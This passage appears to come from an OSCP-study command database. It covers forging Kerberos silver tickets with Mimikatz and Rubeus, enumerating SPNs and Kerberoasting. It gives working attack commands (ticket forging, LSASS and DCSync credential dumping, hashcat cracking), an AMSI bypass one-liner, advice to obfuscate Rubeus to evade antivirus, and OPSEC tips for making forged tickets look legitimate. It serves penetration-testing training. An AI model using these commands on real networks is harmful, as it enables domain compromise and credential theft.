SMB, HTTP, or base64 encoding. On target machine: Mimikatz > kerberos::ptt jeffadmin@http-web04.corp.com.kirbi. ALTERNATIVE: Use Rubeus for ticket conversion: Rubeus.exe dump /service:<service> /nowrap (exports base64), then Rubeus.exe ptt /ticket:<base64> on target machine."", ""PAC validation enabled on target service (rare but fatal)"": ""DIAGNOSIS: Service is configured to validate the PAC with the DC (DC verifies user exists and group memberships are legitimate). Modern patch KB5020805 (Oct 2022) enforces PAC validation. SYMPTOMS: Event ID 4769 on DC shows PAC validation request, followed by access denied. SOLUTION: Silver tickets won't work if PAC validation enabled. ALTERNATIVES:\n1. Use legitimate credentials (password or hash) with Pass-the-Hash or Overpass-the-Hash\n2. Compromise the DC and disable PAC validation (high-risk)\n3. Use Golden Ticket instead (DC-signed, passes PAC validation)\n4. Target different service without PAC validation enabled\n\nDETECTION: Query service config: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>\\Parameters /v ValidateKdcPacSignature (value 1 = enabled)."", ""Service account password changed after hash obtained"": ""DIAGNOSIS: NTLM hash is stale. Kerberos tickets encrypted with old hash won't decrypt on service side. SYMPTOMS: KRB_AP_ERR_MODIFIED error. SOLUTION: Re-obtain current NTLM hash:\n1. Re-run Kerberoasting: impacket-GetUserSPNs with -request, crack new TGS-REP\n2. Re-dump LSASS if service account has active session\n3. Re-run DCSync if you have DA rights\n\nPREVENTION: Check password last set date before forging ticket: Get-NetUser -Identity <service_account> -Properties passwordlastset. If recent, hash may change soon. OSCP EXAM NOTE: Service account passwords typically don't change during exam, but in real engagements this is common (especially if detection alerts password compromise).""}","{""/domain"": ""Target domain's Fully Qualified Domain Name (e.g., corp.com). CRITICAL: Use FQDN, not NetBIOS name. The forged ticket's domain field must match the target service's domain configuration. If mismatch, authentication fails with KRB_AP_ERR_NOT_US. This parameter sets the ticket's 'realm' field in Kerberos protocol. Time to obtain: <5 seconds (run 'echo %userdnsdomain%' or Get-NetDomain)."", ""/sid"": ""Domain Security Identifier WITHOUT the RID (Relative Identifier). Format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX. Extract from 'whoami /user' output by removing the last segment after the final hyphen (that's the user RID, not part of Domain SID). WHY CRITICAL: Mimikatz uses this to construct the PAC (Privilege Attribute Certificate) in the forged ticket. Incorrect SID causes authentication failure with KRB_AP_ERR_MODIFIED. Common mistake: Including the user RID (e.g., -1105) - DON'T. Alternative extraction: Get-DomainSID (PowerView)."", ""/target"": ""Fully Qualified Domain Name of the server where the SPN is registered (e.g., web04.corp.com). MUST match the SPN registration in Active Directory exactly. Verify with 'setspn -L <service_account>' or 'setspn -Q */<hostname>*'. Mismatch between /target and actual SPN registration causes 'Server not found in Kerberos database' error. Use FQDN even if NetBIOS name works for other tools. WHY: Kerberos is FQDN-based. The ticket's 'sname' field must match the service's registered name."", ""/service"": ""SPN service type (protocol identifier in SPN format: service/hostname). Common OSCP-relevant types:\n- cifs: File shares (\\\\server\\share), SMB access, remote admin (C$, ADMIN$). Most common for lateral movement.\n- http: IIS web servers, web applications, REST APIs. Use for web-based exploitation.\n- mssql: Microsoft SQL Server instances (port 1433 default). Use for database access, xp_cmdshell execution.\n- ldap: Active Directory domain controllers, directory queries. Use for DC impersonation (rare for Silver, common for Golden).\n- host: Generic host services (multiple services under one SPN). Use when specific service type unknown.\n- rpcss: Remote Procedure Call services, DCOM. Advanced lateral movement.\n- wsman: Windows Remote Management (WinRM), PowerShell remoting (port 5985/5986).\n\nWHY IT MATTERS: The service field determines which application validates the ticket. Wrong service type = access denied even with valid ticket. Example: Using 'http' ticket to access SMB share (cifs) fails. Time to identify: 30 seconds with 'setspn -Q */<hostname>*'."", ""/rc4"": ""NTLM hash (NT hash, not LM hash) of the service account that runs the target SPN. This is the ENCRYPTION KEY for the service ticket. Mimikatz uses this hash to encrypt the forged PAC and ticket data. The target service decrypts the ticket using the same hash stored in its memory. WHY THIS WORKS: Service accounts decrypt tickets using their own password hash - they don't contact the KDC to validate the ticket's authenticity (unless PAC validation is enabled, which is rare). Sources:\n1. Kerberoasting: Obtain TGS-REP for SPN, crack offline with Hashcat (mode 13100) to get plaintext password, then convert to NTLM (use Rubeus /enctype:rc4 or manually hash with MD4).\n2. LSASS dump: If service account has active session on compromised machine, use Mimikatz 'sekurlsa::logonpasswords' to extract NTLM directly.\n3. DCSync: If you have Domain Admin rights, use 'lsadump::dcsync /user:service_account' to retrieve NTLM without cracking.\n\nFormat: 32 hexadecimal characters (128-bit MD4 hash). Example: 4d28cf5252d39971419580a51484ca09. Case-insensitive. Alternative flags: /aes256 (AES256 key, stealthier but requires key extraction), /aes128 (AES128 key)."", ""/user"": ""Username of the identity you want to impersonate in the forged ticket. THIS CAN BE FICTIONAL - the service application typically does NOT verify the user exists in AD (unless PAC validation enabled, rare). Mimikatz defaults to setting this user as:\n- Domain Administrator (RID 500)\n- Member of Domain Admins (SID S-1-5-21-DOMAIN-DOMAIN-DOMAIN-512)\n- Member of Enterprise Admins, Schema Admins, Administrators\n\nThis gives the forged ticket FULL administrative permissions on the target service. You can use ANY username - common choices:\n1. Real domain admin account (e.g., 'Administrator') - blends with legitimate traffic\n2. Current compromised user (e.g., 'jeff') - maintains appearance of normal activity\n3. Fictional high-privilege account (e.g., 'svcadmin') - works if PAC validation disabled\n\nWHY IT MATTERS: The /user value appears in service logs (Event ID 4624, 4768, 4769), so choose wisely for OPSEC. The actual permissions granted are determined by group memberships in the PAC (which Mimikatz sets to Domain Admins), not the username itself."", ""/ptt"": ""Pass-the-Ticket - Automatically inject the forged ticket into the current logon session's Kerberos ticket cache (same as 'kerberos::ptt'). After injection, any application in the current session can use the ticket transparently (e.g., 'dir \\\\server\\share', 'Invoke-WebRequest http://server'). Alternative: Omit /ptt and manually inject later with 'kerberos::ptt <ticket_file.kirbi>'. WHY USE /ptt: Immediate usage, no intermediate file storage (stealthier), fewer steps. WHY SKIP /ptt: Save ticket to disk for later use, transfer to different machine, or inject into different user session. Without /ptt, Mimikatz saves ticket as '<user>@<service>-<domain>.kirbi' in current directory.""}","[""ad-sid-whoami-extract"", ""impacket-getuserspns-kerberoast"", ""ad-enumerate-spn-target""]","[""ad-silver-ticket-rubeus-create"", ""overpass-mimikatz-pth""]","[""kerberos-klist-verify"", ""ad-silver-ticket-validate-access""]"
"ad-silver-ticket-rubeus-create","Create Silver Ticket with Rubeus","active-directory","Rubeus.exe silver /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /target:<TARGET_SERVER_FQDN> /service:<SPN_SERVICE> /rc4:<SERVICE_ACCOUNT_NTLM> /user:<IMPERSONATED_USER> /ptt","Forge a Kerberos service ticket (TGS) using Rubeus, a modern C# alternative to Mimikatz. Supports AES encryption and better OPSEC with cleaner output and fewer detection signatures.","kerberos-attacks","Rubeus.exe silver /domain:<corp.com> /sid:<S-1-5-21-1987370270-658905905-1781884369> /target:<web04.corp.com> /service:<http> /rc4:<4d28cf5252d39971419580a51484ca09> /user:<jeffadmin> /ptt","RUBEUS VS MIMIKATZ - WHY USE RUBEUS FOR SILVER TICKETS:
 RUBEUS ADVANTAGES:
1.

BETTER OPSEC:
Supports AES256/AES128 encryption (modern standard), RC4 is legacy and suspicious
2.

ACTIVE DEVELOPMENT:
Mimikatz Kerberos module is stable but rarely updated, Rubeus is actively maintained by SpecterOps
3.

CLEANER OUTPUT:
Rubeus shows detailed ticket construction steps (helpful for troubleshooting), base64 output for easy transfer
4.

BATCH OPERATIONS:
Create multiple tickets in one command (/service:cifs,http,mssql)
5.

BETTER ERROR HANDLING:
Rubeus validates parameters and shows detailed error messages (Mimikatz often fails silently)
6.

NO DRIVER NEEDED:
Mimikatz sometimes requires kernel driver for certain operations, Rubeus is pure userland
7.

C2 INTEGRATION:
Rubeus compiles to .NET assembly, easily integrated with Cobalt Strike (execute-assembly), Covenant, etc.

 RUBEUS DISADVANTAGES:
1.

REQUIRES .NET:
Needs .NET Framework 4.5+ (most Windows 10/Server 2016+ have this, older systems may not)
2.

LARGER BINARY:
Rubeus.exe is ~200KB, Mimikatz is ~1.2MB (both detectable, but size matters for upload)
3.

MORE AV SIGNATURES:
Rubeus is popular in penetration testing, many AVs signature-detect it (obfuscation needed)
4.

LESS VERSATILE:
Mimikatz does MANY things (LSASS dump, DCSync, ticket forging, password spraying), Rubeus ONLY does Kerberos attacks

 OSCP RECOMMENDATION:
- LEARN BOTH:
Mimikatz for exam (more versatile, covers more techniques)
- PREFER RUBEUS:
For Silver/Golden tickets specifically (better OPSEC, easier syntax)
- FALLBACK:
If one is detected/blocked, use the other

RUBEUS WORKFLOW FOR OSCP EXAM:
1.

ENUMERATION (Kerberoasting):
   Rubeus.exe kerberoast /outfile:hashes.txt
   - Obtains TGS-REP for all SPNs
   - Outputs Hashcat-compatible format (mode 13100)

2.

CRACK HASHES (offline):
   hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule
   - Retrieves plaintext password OR continue with hash

3.

CONVERT PASSWORD TO NTLM (if you cracked plaintext):
   Rubeus.exe hash /password:cracked_password
   - Outputs NTLM, AES128, AES256 keys

4.

FORGE SILVER TICKET:
   Rubeus.exe silver /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm> /user:admin /ptt
   - Creates and injects ticket

5.

VALIDATE AND ACCESS:
   Rubeus.exe klist
   iwr http://web04.corp.com
   - Confirm ticket exists, test service access

6.

PERSISTENCE (save ticket for later):
   Rubeus.exe silver /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm> /user:admin /nowrap /outfile:ticket.kirbi
   - Saves base64 ticket to file
   - Exfiltrate ticket off network
   - Re-inject later:
Rubeus.exe ptt /ticket:<base64>

RUBEUS COMMAND VARIATIONS:
# Create Silver ticket with AES256 (better OPSEC):
Rubeus.exe silver /aes256:<64_hex_chars> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /ptt

# Create multiple tickets for same server:
Rubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:cifs,http /user:admin /ptt

# Create ticket with custom groups (fine-tuned permissions):
Rubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /groups:512,519 /ptt
(512=Domain Admins, 519=Enterprise Admins)

# Create ticket and output base64 for transfer:
Rubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /nowrap

# Create ticket with specific lifetime (OPSEC):
Rubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /endoflife:20251231235959 /ptt
(Format:
YYYYMMDDHHmmss, sets realistic expiration instead of 10 years)

RUBEUS OPSEC ENHANCEMENTS:
1.

USE AES INSTEAD OF RC4:
   - RC4 (NTLM hash) is legacy, flagged by EDR
   - AES256 is modern standard, blends with normal traffic
   - Obtain AES keys via DCSync or Kerberoasting with /enctype:aes256

2.

SET REALISTIC TICKET LIFETIME:
   - Default 10-year tickets are obvious forgeries
   - Use /endoflife:YYYYMMDDHHmmss to match normal ticket lifetimes (8-24 hours)
   - Check domain policy:
Get-DomainPolicy | Select -ExpandProperty KerberosPolicy (MaxTicketAge)

3.

IMPERSONATE REAL USERS:
   - Using fictional usernames (e.g., /user:fakeadmin) is suspicious
   - Enumerate real domain admins:
Get-NetGroupMember -Identity 'Domain Admins'
   - Use real admin username for /user parameter (appears legitimate in logs)

4.

MATCH GROUP MEMBERSHIPS:
   - Default PAC sets every user as Domain Admin (unrealistic)
   - Enumerate target user's actual groups:
Get-NetUser -Identity <user> | Select -ExpandProperty memberof
   - Set custom groups with /groups:<RID1>,<RID2> to match real user

5.

OBFUSCATE RUBEUS BINARY:
   - Rubeus is heavily signatured by AV
   - Use ConfuserEx to obfuscate .NET assembly
   - OR compile from source with renamed classes/namespaces
   - OR use in-memory loading (Invoke-ReflectivePEInjection, execute-assembly in C2)

COMMON RUBEUS FLAGS REFERENCE:
/domain - Target domain FQDN
/sid - Domain SID (S-1-5-21-XXX-XXX-XXX)
/target - Server FQDN where SPN runs
/service - SPN type (cifs, http, mssql, ldap, host, etc.)
/rc4 - NTLM hash (32 hex chars)
/aes256 - AES256 key (64 hex chars, RECOMMENDED)
/aes128 - AES128 key (32 hex chars)
/user - Impersonated username
/groups - Custom group RIDs (comma-separated, default:
512,513,518,519,520)
/ptt - Pass-the-Ticket (inject into current session)
/outfile - Save ticket to .kirbi file
/nowrap - Output base64 without wrapping (for copy/paste)
/endoflife - Ticket expiration (YYYYMMDDHHmmss format)
/dc - Specify DC for validation (usually not needed for Silver tickets)

TIME ESTIMATES (Rubeus vs Mimikatz):
- Rubeus ticket creation:
<1 minute (same as Mimikatz)
- Rubeus with AES:
+30 seconds (if you need to obtain AES keys first via DCSync)
- Rubeus batch tickets:
<1 minute (creates multiple tickets, faster than multiple Mimikatz commands)
- Rubeus obfuscation:
+5-10 minutes first time (ConfuserEx), reuse obfuscated binary later

OSCP EXAM INTEGRATION:
 When to use Rubeus:
- Modern Windows targets (10/Server 2016+) with .NET 4.5+
- Need AES encryption for stealth (exam may have ""realistic"" monitoring)
- Multiple SPNs on same server (batch ticket creation)
- C2 framework available (execute-assembly integration)

 When to use Mimikatz:
- Older Windows targets (7/Server 2008) without recent .NET
- Need OTHER Mimikatz capabilities (LSASS dump, DCSync) in same session
- Rubeus is detected/blocked and obfuscation failed
- Familiar with Mimikatz syntax (faster execution under time pressure)

FINAL RECOMMENDATION FOR OSCP:
PRACTICE BOTH tools before exam:
1.

Memorize Mimikatz kerberos::golden syntax (versatile, works everywhere)
2.

Learn Rubeus silver syntax (better OPSEC, cleaner output)
3.

During exam:
Try Rubeus FIRST (if .NET available), fallback to Mimikatz if detected
4.

For documentation:
Mention BOTH tools (shows depth of knowledge)

Rubeus is the MODERN choice for Kerberos attacks, but Mimikatz remains the SWISS ARMY KNIFE for AD exploitation.

Know both.","high","","","","{""Rubeus not recognized / AMSI blocks execution"": ""AMSI (Antimalware Scan Interface) may block Rubeus binary or in-memory loading. SOLUTIONS:\n1. Obfuscate binary: Use ConfuserEx, .NET Reactor, or Donut to obfuscate Rubeus.exe\n2. AMSI bypass: Patch AMSI in PowerShell before loading Rubeus: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n3. Compile from source: Download Rubeus source from GitHub, modify function/class names, recompile (breaks signature detection)\n4. Use Rubeus DLL: Compile as DLL, load via Execute-Assembly in Cobalt Strike or similar C2\n5. Fallback: Use Mimikatz if Rubeus detection is insurmountable"", ""Need AES key instead of NTLM hash for better OPSEC"": ""OBTAINING AES KEYS:\n1. DCSync: Mimikatz lsadump::dcsync /user:<service_account> shows 'aes256-cts-hmac-sha1-96' and 'aes128-cts-hmac-sha1-96' keys\n2. Kerberoasting with AES: Rubeus.exe kerberoast /user:<service_account> /enctype:aes256 (requests AES-encrypted TGS instead of RC4)\n3. LSASS dump: Mimikatz sekurlsa::ekeys shows AES keys for logged-on accounts\n\nUSAGE: Rubeus.exe silver /aes256:<64_hex_chars> ... (replace /rc4 with /aes256)\n\nWHY BETTER: AES256 is modern Kerberos standard (MS14-068 patch encourages AES). RC4 tickets are flagged by modern EDR as legacy/suspicious. AES256 tickets blend with normal traffic."", ""Transferring ticket to different machine"": ""RUBEUS METHOD (cleaner than .kirbi files):\n1. Create ticket without /ptt: Rubeus.exe silver ... /outfile:ticket.kirbi\n2. Convert .kirbi to base64: Rubeus.exe describe /ticket:ticket.kirbi /nowrap (outputs base64 string)\n3. Copy base64 string to clipboard, transfer to target machine (paste in RDP, HTTP upload, etc.)\n4. Inject on target: Rubeus.exe ptt /ticket:<base64_string>\n\nALTERNATIVE: Use /nowrap directly during creation: Rubeus.exe silver ... /nowrap (outputs base64 immediately, skip .kirbi intermediate file)\n\nADVANTAGE OVER MIMIKATZ: Base64 encoding allows clipboard transfer, bypasses file-based AV scanning, works in restricted environments where file write is blocked."", ""Creating multiple tickets for different services on same server"": ""Rubeus supports BATCH TICKET CREATION:\nRubeus.exe silver /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:cifs,http,mssql /rc4:<hash> /user:admin /ptt\n\nThis creates THREE tickets (cifs, http, mssql) in ONE command, all injected simultaneously. ADVANTAGE: Access file shares (cifs), web apps (http), AND databases (mssql) with single command. Mimikatz requires three separate kerberos::golden commands.\n\nVERIFY: Rubeus.exe klist shows all three tickets in cache.""}","{""/domain"": ""Target domain FQDN. Same as Mimikatz but Rubeus validates format more strictly (must be valid FQDN, rejects NetBIOS-only names). Rubeus also supports /dc:<dc_fqdn> to specify which DC to target for validation queries (optional, not needed for Silver tickets)."", ""/sid"": ""Domain SID without RID. Rubeus uses this to construct the PAC. Supports /sid:S-1-5-21-XXX OR accepts base64-encoded SID if obtained programmatically. More forgiving of formatting than Mimikatz (auto-trims whitespace)."", ""/target"": ""Target server FQDN where SPN is registered. Rubeus performs additional validation: warns if target doesn't resolve in DNS (helps catch typos). Use /targetuser:<account> instead if you know the service account name (Rubeus will query SPN automatically)."", ""/service"": ""SPN service type. Rubeus supports all standard types (cifs, http, mssql, ldap, host, rpcss, wsman) plus custom SPNs. Multiple services: /service:cifs,http creates tickets for both services simultaneously (Rubeus advantage over Mimikatz). WHY USEFUL: Some servers run multiple SPNs - create all tickets in one command."", ""/rc4"": ""NTLM hash for RC4 encryption. Rubeus ALSO supports /aes256:<hex_key> and /aes128:<hex_key> for AES encryption (RECOMMENDED for OPSEC - AES is modern standard, RC4 is legacy and flagged by modern EDR). To obtain AES keys: DCSync with Mimikatz shows Kerberos keys (aes256-cts-hmac-sha1-96), or use Rubeus /enctype:aes256 during Kerberoasting."", ""/user"": ""Impersonated username. Rubeus defaults to Domain Admins group membership (same as Mimikatz). RUBEUS ADVANTAGE: Use /groups:544,512,519 to manually specify group RIDs (544=Administrators, 512=Domain Admins, 519=Enterprise Admins). Custom groups allow fine-tuned permissions (e.g., /groups:512 only for minimal Domain Admin rights)."", ""/ptt"": ""Pass-the-Ticket - Inject forged ticket into current session. RUBEUS DIFFERENCE: Also supports /outfile:<file.kirbi> to save ticket to disk WITHOUT injecting (useful for ticket transfer). Combine both: /ptt /outfile:ticket.kirbi (inject AND save). RUBEUS ALSO SUPPORTS: /ticket:<base64> to inject pre-existing ticket from base64 string (useful for transferring tickets across machines via clipboard).""}","[""ad-sid-whoami-extract"", ""impacket-getuserspns-kerberoast""]","[""ad-silver-ticket-mimikatz-create""]","[""kerberos-klist-verify"", ""ad-silver-ticket-validate-access""]"
"ad-enumerate-spn-target","Enumerate SPNs for Target Server","enumeration","setspn -Q */<TARGET_SERVER>*","Query Active Directory for all Service Principal Names (SPNs) registered to a specific server. Essential prerequisite for Silver ticket attacks to identify available services and their types.","kerberos-enumeration","setspn -Q */<web04>*","OSCP METHODOLOGY - WHY SPN ENUMERATION IS CRITICAL FOR SILVER TICKETS:
Silver ticket attacks require THREE pieces of information:
1.

Domain SID (extract with whoami /user)
2.

Service account NTLM hash (obtain via Kerberoasting, LSASS dump, or DCSync)
3.

TARGET SPN - THIS IS WHAT THIS COMMAND PROVIDES

WITHOUT accurate SPN information, your Silver ticket will FAIL with errors like:
- 'Server not found in Kerberos database' (hostname mismatch)
- 'Access denied' (wrong service type)
- 'KRB_AP_ERR_NOT_US' (service/hostname doesn't match SPN registration)

setspn IS THE AUTHORITATIVE SOURCE for SPN information in Active Directory.

It queries the actual SPN registrations, not assumptions.

COMMON OSCP WORKFLOW:
1.

ENUMERATE TARGET SERVER (you know hostname, e.g., WEB04):
   setspn -Q */web04*
   OUTPUT EXAMPLE:
   Existing SPN found:
   http/web04.corp.com
   Registered to:
CORP\iis_service

2.

RECORD SPN DETAILS:
   - Service type:
http
   - Hostname:
web04.corp.com (use EXACT format from output)
   - Service account:
iis_service

3.

KERBEROAST SERVICE ACCOUNT (to get NTLM hash):
   impacket-GetUserSPNs corp.com/jeff:password -request-user iis_service
   Crack TGS-REP with Hashcat to get NTLM hash

4.

CREATE SILVER TICKET:
   mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<hash> /user:admin /ptt
   (Use EXACT /target value from setspn output)

5.

VALIDATE ACCESS:
   iwr http://web04.corp.com
   (Access works because service type and hostname match SPN registration)

SPN SERVICE TYPES - OSCP RELEVANCE:
HIGH-VALUE SPNs FOR LATERAL MOVEMENT:
1.

cifs (File Shares, SMB):
   - Access:
dir \\server\C$, copy files, remote admin
   - Prevalence:
Nearly every Windows server (auto-registered)
   - OSCP usage:
Most common Silver ticket target (file access, PsExec, lateral movement)

2.

http (IIS, Web Applications):
   - Access:
Web admin panels, upload webshells, REST APIs
   - Prevalence:
Web servers, SharePoint, Exchange OWA
   - OSCP usage:
Upload reverse shell to restricted admin interface, access web-based management

3.

mssql (SQL Server):
   - Access:
Database queries, xp_cmdshell RCE, linked servers
   - Prevalence:
SQL Servers (duh)
   - OSCP usage:
Enable xp_cmdshell, execute OS commands, pivot to linked servers

4.

host (Generic Host Services):
   - Access:
WMI, RPC, scheduled tasks, service creation
   - Prevalence:
All domain-joined computers (auto-registered)
   - OSCP usage:
Remote service creation, scheduled task execution, WMI code execution

5.

ldap (Directory Services):
   - Access:
LDAP queries, directory modifications, DCSync (if permissions exist)
   - Prevalence:
Domain controllers only
   - OSCP usage:
Rare for Silver (use Golden instead), specific LDAP exploits

6.

wsman (Windows Remote Management):
   - Access:
PowerShell remoting (Enter-PSSession, Invoke-Command)
   - Prevalence:
Servers with WinRM enabled (port 5985/5986)
   - OSCP usage:
Remote PowerShell execution, pivot without SMB (stealthier)

LOW-VALUE SPNs (less common in OSCP):
- rpcss (RPC Endpoint Mapper) - Covered by host/
- oracle, ftp, smtp, etc.

- Specific services, rare in OSCP exam

MANUAL ALTERNATIVE (if setspn unavailable):
PowerView (PowerShell):
```powershell
Get-NetUser -SPN | Where {$_.serviceprincipalname -match 'web04'} | Select serviceprincipalname
```
ADVANTAGES:
Faster, filterable, shows additional properties (pwdlastset, admin count)

LDAP query (raw):
```powershell
([adsisearcher]""(serviceprincipalname=*/web04*)"").FindAll() | ForEach-Object { $_.Properties.serviceprincipalname }
```
ADVANTAGES:
No external tools needed, pure PowerShell

impacket-GetUserSPNs (Linux):
```bash
impacket-GetUserSPNs corp.com/jeff:password -request
```
LIMITATION:
Only shows SPNs for USER ACCOUNTS (not computer accounts), but that's often what you want for Kerberoasting anyway

TIME ESTIMATES:
- setspn -Q for single server:
<5 seconds
- setspn -Q for all SPNs in domain:
30-60 seconds (large domains)
- PowerView Get-NetUser -SPN:
<10 seconds (faster than setspn for full dump)
- impacket-GetUserSPNs:
5-10 seconds (network latency, LDAP query)

OSCP EXAM TIPS:
1.

ENUMERATE SPNs EARLY in the engagement (during AD enumeration phase)
2.

CREATE A TARGET LIST of high-value SPNs:
   - SQL servers (mssql) - potential xp_cmdshell RCE
   - Web servers (http) - potential webshell upload
   - File servers (cifs) - data exfiltration, lateral movement
3.

PRIORITIZE SPNs associated with USER ACCOUNTS (crackable) over computer accounts
4.

DOCUMENT EXACT HOSTNAMES from setspn output (copy/paste into notes for Silver ticket creation later)
5.

CROSS-REFERENCE with service account enumeration:
   setspn -Q */web04*  Registered to:
CORP\iis_service
   Then:
Get-NetUser -Identity iis_service  Check pwdlastset, memberof, admincount
6.

IF SETSPN IS BLOCKED (rare), fallback to PowerView or impacket

COMBINING WITH KERBEROASTING WORKFLOW:
# Step 1:
Enumerate ALL SPNs associated with user accounts (Kerberoasting targets)
impacket-GetUserSPNs corp.com/jeff:password -request -outputfile tgs.txt

# Step 2:
Crack TGS-REP hashes (offline)
hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule
# Result:
iis_service:Password123

# Step 3:
Identify SPNs for compromised service account
setspn -Q */iis_service* OR setspn -L iis_service
# Result:
http/web04.corp.com registered to iis_service

# Step 4:
Create Silver ticket for identified SPN
mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm_hash_of_Password123> /user:admin /ptt

# Step 5:
Access service
iwr http://web04.corp.com

SPN ENUMERATION FOR PERSISTENCE:
If you've compromised a service account (via Kerberoasting or LSASS dump), enumerate ALL SPNs associated with that account:
setspn -L iis_service

RESULT EXAMPLE:
Registered ServicePrincipalNames for CN=IIS Service,CN=Users,DC=corp,DC=com:
    http/web04.corp.com
    http/web05.corp.com
    http/intranet.corp.com

IMPLICATION:
Single service account hash gives you Silver ticket access to MULTIPLE servers (web04, web05, intranet).

Create tickets for all of them:
mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<hash> /user:admin /ptt
mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web05.corp.com /service:http /rc4:<hash> /user:admin /ptt
mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:intranet.corp.com /service:http /rc4:<hash> /user:admin /ptt

THIS IS A FORCE MULTIPLIER - One compromised service account can grant access to dozens of services.

CROSS-REFERENCE WITH OTHER ENUMERATION:
- Combine with session enumeration:
Get-NetSession -ComputerName web04 (who's logged on?)
- Combine with privilege enumeration:
Get-NetLocalGroupMember -ComputerName web04 -GroupName Administrators (who can admin this server?)
- Combine with share enumeration:
Find-DomainShare -CheckShareAccess -ComputerName web04 (what's accessible?)

This gives you CONTEXT:
Not just ""web04 has http SPN"", but ""web04 has http SPN, iis_service account runs it, domain admin 'jeff' has active session, C$ share is accessible"".

This informs your attack path.

FINAL OSCP EXAM INTEGRATION:
setspn IS THE BRIDGE between Kerberoasting (obtaining service account hashes) and Silver tickets (using those hashes for lateral movement).

Without accurate SPN enumeration, you can't create working Silver tickets.

This command is NOT optional - it's MANDATORY for Silver ticket attacks.

PRACTICE UNTIL YOU CAN:
1.

Run setspn -Q */target* from memory
2.

Parse SPN format (extract service type and hostname)
3.

Cross-reference with service account (setspn -L <account>)
4.

Feed SPN data into Silver ticket creation (exact /target and /service values)
5.

Troubleshoot mismatches (hostname format, service type errors)

You'll use this command 5-10 times per OSCP exam (once per target server for Silver ticket prep).","high","","","","{""No SPNs found but server exists"": ""DIAGNOSIS: Server may not have SPNs registered, or SPNs registered under different hostname format. SOLUTIONS:\n1. Try FQDN: setspn -Q */web04.corp.com* (use full domain name)\n2. Try NetBIOS: setspn -Q */WEB04* (uppercase, NetBIOS name)\n3. Query by IP: NOT SUPPORTED by setspn (SPNs are name-based, not IP-based). Use nslookup <IP> to resolve hostname first.\n4. Check computer account: setspn -L WEB04$ (computer accounts often have host/ and cifs/ SPNs auto-registered)\n5. Broad search: setspn -Q */* | findstr /i web04 (search ALL SPNs, filter for target)\n\nCOMMON CAUSE: Web servers often register SPNs under abbreviated name (web04) but you're querying FQDN (web04.corp.com) or vice versa."", ""Need to find ALL SPNs in domain (comprehensive enumeration)"": ""WARNING: This queries EVERY SPN in AD (slow on large domains, 1000+ results possible):\nsetspn -T corp.com -Q */*\n\nBETTER APPROACH for OSCP:\n1. Target specific service types: setspn -Q http/* (all web servers), setspn -Q mssql/* (all SQL servers)\n2. Use PowerView (faster, more features): Get-NetUser -SPN | Select serviceprincipalname\n3. Filter by service account: Get-NetUser -SPN | Where {$_.admincount -eq 1} (high-privilege service accounts)\n\nTime estimate: Full domain SPN dump takes 30-60 seconds on exam-sized domain, PowerView is faster (<10 sec)."", ""Identify which SPNs are associated with user accounts vs computer accounts"": ""USER ACCOUNTS (high-value targets for Kerberoasting and Silver tickets):\n- Registered to: DOMAIN\\username (e.g., CORP\\sqlservice)\n- Typically: mssql, http, oracle, custom applications\n- WHY VALUABLE: User accounts have crackable passwords (computer account passwords are 120+ random chars)\n\nCOMPUTER ACCOUNTS (less valuable for cracking, still useful for Silver tickets):\n- Registered to: DOMAIN\\COMPUTERNAME$ (e.g., CORP\\WEB04$)\n- Typically: host, cifs, ldap (auto-registered by Windows)\n- WHY LESS VALUABLE: Computer account passwords are 120-char random strings (uncrackable), but if you've dumped LSASS on that machine you have the hash\n\nFILTER FOR USER ACCOUNTS ONLY (PowerView):\nGet-NetUser -SPN | Where {$_.samaccountname -notmatch '\\$$'}\n(Excludes computer accounts, which end with $)"", ""Understanding SPN format and extracting service type"": ""SPN FORMAT: service/hostname.domain.com:port\n\nEXAMPLES AND BREAKDOWN:\n1. http/web04.corp.com\n   - Service: http (IIS, web applications)\n   - Hostname: web04.corp.com\n   - Port: (not specified, defaults to 80 for http, 443 for https)\n   - USE FOR SILVER TICKET: /service:http /target:web04.corp.com\n\n2. mssql/sql01.corp.com:1433\n   - Service: mssql (Microsoft SQL Server)\n   - Hostname: sql01.corp.com\n   - Port: 1433 (SQL Server default)\n   - USE FOR SILVER TICKET: /service:mssql /target:sql01.corp.com\n\n3. cifs/fileserver.corp.com\n   - Service: cifs (Common Internet File System - file shares, SMB)\n   - Hostname: fileserver.corp.com\n   - Port: (not specified, defaults to 445 for SMB)\n   - USE FOR SILVER TICKET: /service:cifs /target:fileserver.corp.com\n\n4. host/dc01.corp.com\n   - Service: host (generic host services - RPC, WMI, remote admin)\n   - Hostname: dc01.corp.com\n   - Port: (not specified, multiple ports depending on service)\n   - USE FOR SILVER TICKET: /service:host /target:dc01.corp.com\n\nEXTRACTION FOR SILVER TICKET:\n- /service parameter = everything BEFORE the slash (http, mssql, cifs, host, etc.)\n- /target parameter = everything BETWEEN slash and colon (OR slash and end if no port)\n- Ignore port number for Silver ticket creation (Mimikatz/Rubeus don't use it)""}","{""setspn"": ""Windows built-in utility for managing Service 